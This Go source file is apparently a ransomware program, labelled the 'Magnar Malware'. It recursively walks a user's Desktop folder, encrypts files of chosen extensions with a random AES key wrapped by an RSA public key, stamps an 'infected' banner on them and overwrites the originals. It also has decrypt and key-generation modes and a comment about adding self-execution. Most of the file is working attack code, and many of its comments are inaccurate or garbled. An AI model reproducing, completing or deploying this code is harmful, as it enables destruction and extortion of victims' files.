/**
* This file is licensed under BSD 3-Clause License
*
* Copyright (c) 2020, magnar-blj
* All rights reserved.
*
* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
*
* 1. Redistributions of source code must retain the above copyright notice, this
*    list of conditions and the following disclaimer.
*
* 2. Redistributions in binary form must reproduce the above copyright notice,
*    this list of conditions and the following disclaimer in the documentation
*    and/or other materials provided with the distribution.
*
* 3. Neither the name of the copyright holder nor the names of its
*    contributors may be used to endorse or promote products derived from
*    this software without specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*
*/

package main // name of this package

import ( // import all utilities
	"bytes" // import the bytes ibrairy for memory 
	"crypto/rsa" // import the crypto/rsa librairy for encryption
	"crypto/sha1" // import the crypto/sha1 for the private key
	"flag" // import flag for commandline arguments
	"io/ioutil" // import the io/ioutils librairy for user input and output 
	"log" // import the log librairy for logging services
	"path/filepath" // import filepath for the file locations 
)

const readKeyLen = 256 // specify the maximum bytes that can be read from a file
var encrypt_immune_files = []string {"magnar.exe"} // define files, which are not affected by ecnryption

var area ="%USERPROFILE%/Desktop" // define the folder which is beeing to be recursively encrpyted (c:\Users\Corinne\Desktop)
var infected_message = "------------------ You arE BeeIng nuCed by The MaGnaR MaLwAre --------------------" // define the message which is beeing written to the encrypted files


func main() { // begin function main

	kind := flag.String("opt", "", "Select one of the values: encrypt | decrypt | keygen.") // some help message for usage with the -opt flag (options)
	keypath := flag.String("keypath", "", "Path of private or public key.") // some help methods for the usage of keypaths (location of the private.key file whitch acts as a password)
	flag.StringVar(&area, "area", "", "Directory path to infect.") // help message to define the target encryption folder / but we could even delete this line.
	flag.StringVar(&infected_message, "message", "hello", "Messages to be written to the infected file.") // same with this just some lil overhead 
	
	// add something to execute itselfe like in c: system("magnar.exe /S")
    flag.Parse() // start the command line

	if *kind == "encrypt" || *kind == "decrypt" { // if target is beeing en or decrypted do some stuff...
		if area == "" { 
			// if no flags are beiing passed just shout out a message
			println("Input [area] parameter. Directory path to infect.")
			return // return null which sis default
		}

		if *keypath == "" { // if no key location is beeing provided do some stuff...
			// show some help messgae 
			println("Input the [keypath] parameters. 'encrypt' requires a private key and 'decrypt' requires a public key.")
			return // return null as default
		}
	}

	if *kind == "encrypt" { // if the folder is intended to be encrypted
		encrypt_extension := flag.Args() // scan the commandline arguments
		if len(encrypt_extension) == 0 { // if the filename extension is not existing...
			println("Input the name of the extension to be infected in the last parameters.") // call some help message
			return // return null as default
		}

		publicKey := RSALoadPublicKey(keypath) // define the public key as the random generated key

		if publicKey == nil{ // if public keyfile is empty....
			println("public key doesn't exists. keypath is", keypath) // public key does not exist
			return // return null as default
		}
		Doencrypt(publicKey, encrypt_extension) // ecrypt the public key and the filename extension
		println("encrypted.") // print encrpted status messsage
	} else if *kind == "decrypt" { // if commandline argument is decr<pt doo...
		privateKey := RSALoadPrivateKey(keypath) // define the random key as a private key file
		if privateKey == nil { // if pürivate.key doesnt exist... 
			println("private key doesn't exists. keypath is ", keypath) // some error message
			return // return null as defautl
		}
		DoDecrypt(privateKey) // decrypt the private key
		println("decrypted.") // message decrypted
	} else if *kind == "keygen" { // if commandline == keygen
		RSACreateKey() // generate a random key
		println("Magnar: public.key and private.key generated.") // some status messgae
	} else if *kind == "" { // if commandline option is empty ...
		println("please input the [opt] option. select one of the values: encrypt | decrypt | keygen") // some message
	} else { // esle do...
		println("invalid kind " + *kind) /// some errror message
		return // return null as default
	} /// end
} /// end

func Doencrypt(publicKey *rsa.PublicKey, encrypt_extension []string) { // begin the encryption phase for all hashes
	Walk(area, func(fpath string) { // scan the ile path

		defer func() { // some recursive function
			if err := recover(); err != nil { // if encryption error mesage isnt undefined
				log.Fatal(err) // error message
				return // return null as default
			} 
		}()
		ext := filepath.Ext(fpath) // define extesntion als filepath extension
		

		if StringInSlice(filepath.Base(fpath), encrypt_immune_files) { // if target the magnar.exe file
			// return a passed and immune message 
			println("[passed - immune] ", fpath)
			return // return null default
		}
		if !StringInSlice(ext, encrypt_extension)  {
			println("[passed - exit] ", fpath)
			return // return null as default
		}

		read, err := ioutil.ReadFile(fpath) // if the filelocation doesnt exist ...
		if err != nil { // if error mesage isnt undefined do...
			// print failure message
			println("[read file failed] ", fpath)
			return // return null as default
		}

		imlen := len(infected_message) // call infected message
		readlen := len(read) // read bytes from target file

		if imlen > readlen {  // im message is too long ...
			// print some failure message
			println("[data size error] ", fpath)
			return // return null as default
		}
		if IsInfected(read) { // if the target file is already infected do...
			// print some pass message
			println("[passed already infected] ", fpath)
			return // return null as default
		}

		aesRandKey := []byte(randSeq(16)) // create a random 16bytes key for te data in the target file
		aesEncryptedRandKey := RSAencrypt(publicKey, aesRandKey) // ecnrypt the random key using RSA-encrytion

		encryptedData, err := encryptByte(aesRandKey, read) // if encrypted data is too long..
		if err != nil { // and if error message isnt undefined do...
			log.Fatal(err) // print a fata error message
			return // return null as default
		}

		byteInfectedMessage := []byte(infected_message) // define the bytes ffrom the infection message

		b := [][]byte{byteInfectedMessage, aesEncryptedRandKey, encryptedData} // allocate variable b to file data, randomkey and infection message
		b2 := bytes.Join(b, []byte("")) // call bytes.join method to add all together
		ioutil.WriteFile(fpath, b2, 0) // write the end file 
		println("[cracked: encrypted] ", fpath) // print the cracked status message
	}) 

}

func DoDecrypt(privateKey *rsa.PrivateKey) { // same function as above just for decryption

	Walk(area, func(fpath string) { // scan the filepath
		defer func() { // recursive function
			if err := recover(); err != nil { // if eeror message isnt undefined do...
				log.Fatal(err) // fatal error message
			}
		}()

		read, err := ioutil.ReadFile(fpath) // read filepath
		if err != nil { // if filepath is unddefined
			println("[read file error] " + fpath) // print error message
			return // return null as default
		}

		imlen := len(infected_message) // allocate bytes for infected message
		readlen := len(read) // read length of data

		if imlen > readlen { // if messsage bytes are longer than data bytes do...
			println("[data size error] " + fpath) // error message
			return // return null as defaut
		}

		if !IsInfected(read) { // if normal file is encrypted do..
			println("[passed] " + fpath) // success message
			return // return null as default
		}

		dataStartIndex := imlen + readKeyLen // define dataIndex as message length + data length 

		aesEncryptedRandKey := read[imlen:dataStartIndex]  // aesRandom key is just the bytes allocated from dataIndex and error message
		datastr := read[dataStartIndex:] // define dataString as byte allocation from dataIndex

		aesKey := RSADecrypt(privateKey, sha1.New(), aesEncryptedRandKey) // refer from aesKey variable to an RSA-encrypted key with a private sha1 ke
		decrypted, err := decryptByte(aesKey, datastr) // decrypted versionis just an decrypted allocation of the aesKey and the dataSrt value
		if err != nil { // if error int undefined do...
			println("[decrypt byte error] " + fpath) // print error message
			return // return null as default
		} 

		err = ioutil.WriteFile(fpath, decrypted, 0) // declare err as file which is being written to fpath and decrpyted
		if err != nil { // if err file isnt undefined
			println("[write file error] " + fpath) // pop an error message
			return // return null as default
		}
		println("[decrypted] " + fpath) // print status messages
	}) /// end
} /// end

func IsInfected(read []byte) bool { // begin is infrected function

	imlen := len(infected_message) // imlen var is same as infected message
	str := "" // string is empty xD
	for i := 0; i < imlen; i++ { // some trivial forloops to read bytes before allocation
		str += string(read[i]) // do some string reads
	}

	if str == infected_message { // if string is infected message
		return true // return true as default
	} else { // esle do...
		return false // return false as default
	}
}
